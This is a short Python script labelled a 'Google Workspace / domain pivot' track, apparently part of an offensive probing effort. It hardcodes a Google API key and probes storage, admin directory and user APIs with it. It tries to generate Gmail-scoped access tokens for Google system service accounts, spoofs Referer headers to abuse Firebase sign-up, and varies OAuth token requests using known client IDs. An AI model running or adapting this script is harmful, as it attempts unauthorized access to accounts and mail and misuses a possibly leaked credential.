import requests, json

api_key = 'AIzaSyA6RHlWHTfUEqMzdfQQQSmugsGcoDIxnAg'

print('=== TRACK J: GOOGLE WORKSPACE / DOMAIN PIVOT ===')

# 1. Test AIza key against various APIs
print('1. AIza key API probes')
apis = [
    f'https://www.googleapis.com/discovery/v1/apis?key={api_key}',
    f'https://www.googleapis.com/storage/v1/b?key={api_key}',
    f'https://www.googleapis.com/oauth2/v2/userinfo?key={api_key}',
    f'https://people.googleapis.com/v1/people/me?key={api_key}',
    f'https://www.googleapis.com/admin/directory/v1/users?key={api_key}',
]
for url in apis:
    try:
        r = requests.get(url, timeout=10)
        print(f'  {url.split("?")[0].split("/")[-1]} -> HTTP {r.status_code} {r.text[:150]}')
    except Exception as e:
        print(f'  Error: {str(e)[:60]}')

# 2. GCP Service Account delegation
print()
print('2. GCP IAM Credentials API')
gcp_eps = [
    f'https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/gmail-api-push@system.gserviceaccount.com:generateAccessToken',
    f'https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/firebase-storage@system.gserviceaccount.com:generateAccessToken',
]
for ep in gcp_eps:
    r = requests.post(ep, json={'scope': ['https://mail.google.com/']}, timeout=10)
    print(f'  POST {ep.split("/")[-1].split("?")[0]} -> HTTP {r.status_code} {r.text[:150]}')

# 3. Try Firebase with proper Referer header
print()
print('3. Firebase Auth with Referer header')
fb_url = f'https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={api_key}'
referrers = ['https://mail.google.com/', 'https://accounts.google.com/', 'https://console.firebase.google.com/', 'https://localhost:5000/']
for ref in referrers:
    r = requests.post(fb_url, json={'returnSecureToken': True}, headers={'Referer': ref}, timeout=10)
    print(f'  Referer={ref[:40]} -> HTTP {r.status_code} {r.text[:150]}')

# 4. Try the GSI iframe token exchange
print()
print('4. GSI iframe /o/oauth2/iframe deep dive')
r = requests.get('https://accounts.google.com/o/oauth2/iframe', timeout=10)
print(f'  HTTP {r.status_code} ({len(r.text)} bytes)')
print(f'  Content: {r.text[:600]}')

# 5. OAuth authorize endpoint with gsi iframe origin
print()
print('5. OAuth auth with gsi iframe params')
cid = '764086051850-6qr4p6gpi6hn506pt8ejuq83di341hur.apps.googleusercontent.com'
params = '?response_type=code&client_id='+cid+'&redirect_uri=http://localhost&scope=https://mail.google.com/&access_type=offline&origin=https://accounts.google.com&include_granted_scopes=true&enable_granular_consent=false'
r = requests.get('https://accounts.google.com/o/oauth2/auth'+params, allow_redirects=False, timeout=10)
print(f'  HTTP {r.status_code} loc={r.headers.get("Location","")[:200]}')

# 6. Try the OAuth v2 token endpoint with different auth methods
print()
print('6. Token endpoint auth method variations')
token_url = 'https://oauth2.googleapis.com/token'
# Try with client_id in body AND header
from requests.auth import HTTPBasicAuth
for cid in ['77185425430.apps.googleusercontent.com', '764086051850-6qr4p6gpi6hn506pt8ejuq83di341hur.apps.googleusercontent.com']:
    r = requests.post(token_url, data={
        'grant_type': 'authorization_code',
        'code': '4/0AX4XfWi_test',
        'redirect_uri': 'http://localhost'
    }, auth=HTTPBasicAuth(cid, ''), timeout=10)
    print(f'  Basic auth cid={cid[:30]}... -> HTTP {r.status_code} {r.text[:150]}')

# 7. Try client_id as query param
print()
print('7. Query param client_id')
r = requests.post(f'{token_url}?client_id=77185425430.apps.googleusercontent.com', data={
    'grant_type': 'authorization_code',
    'code': '4/0AX4XfWi_test',
    'redirect_uri': 'http://localhost:5000/callback'
}, timeout=10)
print(f'  HTTP {r.status_code} {r.text[:150]}')
